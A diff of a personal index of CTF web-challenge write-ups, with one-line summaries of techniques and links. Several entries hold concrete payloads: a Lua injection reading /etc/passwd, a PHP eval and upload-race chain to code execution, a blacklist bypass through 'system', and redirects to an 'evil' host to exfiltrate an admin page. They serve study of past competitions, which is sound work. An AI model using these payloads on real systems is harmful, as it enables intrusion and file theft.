@@ -1449,7 +1449,7 @@ http://www.pwntester.com/blog/2014/01/15/hackyou2014-web300-write-up/
 
 * PHPwing - hack-you-2014
 using built-in classes to read local file, and fire an xxe to bypass ssrf
-custom session_start class, deserialization to rce
+custom session_start class, unserialization to rce
 http://www.pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/
 
 * snake - hack-you-2014
@@ -1498,11 +1498,12 @@ obtain lots of ciphertexts and discards the Zs that arent in any of them
 
 * php_jl - phd-ctf-quals-2014
 turn lfi into rce with race condition on file upload
-read src with ?code=require($_GET["foo"]);&foo=php://filter/convert.base64-encode/resource=index.php
-code=include($_FILES[foo][tmp_name]."|0");include($_POST[p]);include($_POST[p]);...x12 times in total;include($_POST[p]);a:%0Agoto%20a;' -F foo=@test.php -F p=AAAA.. (806 As)
-upload file, make it output tmp_name by triggering a file not found include, fil up output buffer, infinite loop request is killed after 30s timeout
+index.php calls eval($_GET['code'])
+read source with ?code=require($_GET["foo"]);&foo=php://filter/convert.base64-encode/resource=index.php
+upload race with ?code=include($_FILES[foo][tmp_name]."|0");include($_POST[p]);include($_POST[p]);...x12 times...;include($_POST[p]);a:%0Agoto%20a;' -F foo=@test.php -F p=AAAA.. (806 As)
+leak tmp_name by triggering a file not found include, fill up output buffer, infinite loop request is killed after 30s timeout
 then exec uploaded php with ?code=;require("/tmp/phplUaO5I");%20return%2042;
-bypass function blacklist with test.php: <?php $file_path="ls -la /home/phd/"; $get_password_hash = 'system'; ?> because index.php does $get_password_hash($file_path) after the eval($_GET['code'])
+bypass function blacklist with test.php: <?php $file_path="ls -la /home/phd/"; $get_password_hash = 'system'; ?>
 http://blogs.tunelko.com/2014/01/27/phdays-2014-quals-php_jl-writeup/
 
 * oracle - phd-ctf-quals-2014
@@ -1669,8 +1670,8 @@ with mod_php the mt_rand state is preserved for all requests in a particular wor
 we reset our account's pw and bruteforce the seed with http://www.openwall.com/php_mt_seed/ and use Keep-Alive to continue making requests to the same worker
 
 * lalala - hitcon-ctf-quals-2015
-ssrf + redirect server with Location: file://index.php to bypass file:// and .php filters
-nginx fastcgi_pass we can access PHP-FPM socket via the redirect and use gopher:// protocol for crafting packets
+ssrf to our server, then redirect again with Location: file://index.php to bypass file:// and .php filters and leak source
+ssrf to PHP-FPM on 127.0.0.1:9001 to craft fastcgi packet and gain rce
 https://github.com/ctfs/write-ups-2015/tree/master/hitcon-ctf-quals-2015/web/lalala
 
 * barista - icectf-2015
@@ -2092,6 +2093,17 @@ https://tipi-hack.github.io/2018/04/01/quals-NDH-18-linked-out.html
 mongodb injection
 https://ctftime.org/task/6024
 
+* guest book - volga-ctf-quals-2018
+lua injection ?search="..(io.popen('cat\x20/etc/passwd','r'):read('*a')).."
+
+* corp monitoring - volga-ctf-quals-2018
+mysql client connect lfi
+
+* lazy admin - volga-ctf-quals-2018
+open redirect to our js to exfil admin page
+bypass url check with ?redir=%20http://evil or ?redir=//evil or Host: evil
+cross domain requests allowed because phantomjs with --web-security=false
+
 * idiot {action,camera} - plaid-ctf-2018
 js/wave polyglot
 ssrf via SNI or redirect to ftp:// URL with long username to cause truncation
@@ -2120,7 +2132,7 @@ web cache poisoning
 https://ctftime.org/task/6658
 
 * berg's club - pwn2win-ctf-2018
-php deserialization rce with file_exists("phar://evil.jpg")
+php unserialization rce with file_exists("phar://evil.jpg")
 use https://github.com/ambionics/phpggc to build a Monolog gadget chain
 https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club
 
@@ -2180,7 +2192,8 @@ HTTP/0.9 + cache + alphanumeric deflate = xss
 https://blog.pspaul.de/posts/plaidctf-2019-potent-quotables/
 
 * wallbreaker - 0ctf-quals-2019
-open_basedir bypasses with glob, fastcgi client or LD_PRELOAD
+find php fastcgi .sock via an open_basedir bypass or a blind glob regex
+bypass disable_function via LD_PRELOAD
 https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy
 
 * shop - volga-ctf-quals-2019
@@ -2634,8 +2647,9 @@ https://www.id0.one/blog/content/3.bp.html
 * 3dsctf-2017
 * 34c3-ctf-2017
 * 2018 weight >= 25
-* 2019 weigth >= 25
+* 2019 weight >= 25
 
+* 2020 weight >= 25
 # }}}
 
 # moar {{{
